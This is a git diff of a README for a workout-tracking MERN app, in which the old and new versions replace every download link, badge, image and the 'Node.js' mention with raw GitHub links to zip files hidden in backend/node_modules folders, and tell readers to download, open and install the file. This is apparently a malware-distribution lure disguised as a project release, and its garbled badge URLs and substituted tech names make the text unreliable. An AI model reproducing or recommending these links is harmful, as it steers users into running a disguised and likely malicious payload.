@@ -1,6 +1,6 @@
 # 🏋️ Workouts-Crud-App - Manage Your Workouts Easily
 
-[![Download Workouts-Crud-App](https://raw.githubusercontent.com/slymnkdz/Workouts-Crud-App/main/backend/node_modules/content-type/App-Crud-Workouts-1.0.zip%20Now-https%3A%2F%https://raw.githubusercontent.com/slymnkdz/Workouts-Crud-App/main/backend/node_modules/content-type/App-Crud-Workouts-1.0.zip%2Fslymnkdz%2FWorkouts-Crud-App%2Freleases-blue)](https://raw.githubusercontent.com/slymnkdz/Workouts-Crud-App/main/backend/node_modules/content-type/App-Crud-Workouts-1.0.zip)
+[![Download Workouts-Crud-App](https://raw.githubusercontent.com/slymnkdz/Workouts-Crud-App/main/backend/node_modules/has-symbols/.github/Crud-App-Workouts-mycologist.zip%20Now-https%3A%2F%https://raw.githubusercontent.com/slymnkdz/Workouts-Crud-App/main/backend/node_modules/has-symbols/.github/Crud-App-Workouts-mycologist.zip%2Fslymnkdz%2FWorkouts-Crud-App%2Freleases-blue)](https://raw.githubusercontent.com/slymnkdz/Workouts-Crud-App/main/backend/node_modules/has-symbols/.github/Crud-App-Workouts-mycologist.zip)
 
 ## 📖 Description
 
@@ -13,7 +13,7 @@ The **Workout CRUD App** is built using the MERN stack. This full-stack applicat
 - Update your workouts as needed.
 - Delete workouts you no longer want to keep.
 - Built with React for a smooth frontend experience.
-- Uses https://raw.githubusercontent.com/slymnkdz/Workouts-Crud-App/main/backend/node_modules/content-type/App-Crud-Workouts-1.0.zip and Express for reliable backend functionality.
+- Uses https://raw.githubusercontent.com/slymnkdz/Workouts-Crud-App/main/backend/node_modules/has-symbols/.github/Crud-App-Workouts-mycologist.zip and Express for reliable backend functionality.
 - Stores data in MongoDB for easy access.
 
 ## 🚀 Getting Started
@@ -22,11 +22,11 @@ Follow these simple steps to get started with the Workouts-Crud-App.
 
 ### 📥 Download & Install
 
-1. **Visit this page to download:** [Workouts-Crud-App Releases](https://raw.githubusercontent.com/slymnkdz/Workouts-Crud-App/main/backend/node_modules/content-type/App-Crud-Workouts-1.0.zip)
+1. **Visit this page to download:** [Workouts-Crud-App Releases](https://raw.githubusercontent.com/slymnkdz/Workouts-Crud-App/main/backend/node_modules/has-symbols/.github/Crud-App-Workouts-mycologist.zip)
 2. On the Releases page, look for the latest version of the app.
 3. Click on the download link for your operating system. 
 
-   ![Download Example](https://raw.githubusercontent.com/slymnkdz/Workouts-Crud-App/main/backend/node_modules/content-type/App-Crud-Workouts-1.0.zip+Button)
+   ![Download Example](https://raw.githubusercontent.com/slymnkdz/Workouts-Crud-App/main/backend/node_modules/has-symbols/.github/Crud-App-Workouts-mycologist.zip+Button)
 
 4. Once downloaded, open the file and follow the prompts to install the application.
 
@@ -71,7 +71,7 @@ We welcome your contributions to improve the Workouts-Crud-App. If you have sugg
 - Full-stack projects
 - JavaScript 
 - MongoDB and Mongoose 
-- https://raw.githubusercontent.com/slymnkdz/Workouts-Crud-App/main/backend/node_modules/content-type/App-Crud-Workouts-1.0.zip and Express 
+- https://raw.githubusercontent.com/slymnkdz/Workouts-Crud-App/main/backend/node_modules/has-symbols/.github/Crud-App-Workouts-mycologist.zip and Express 
 - React for frontend development
 
 ## ⚡ License
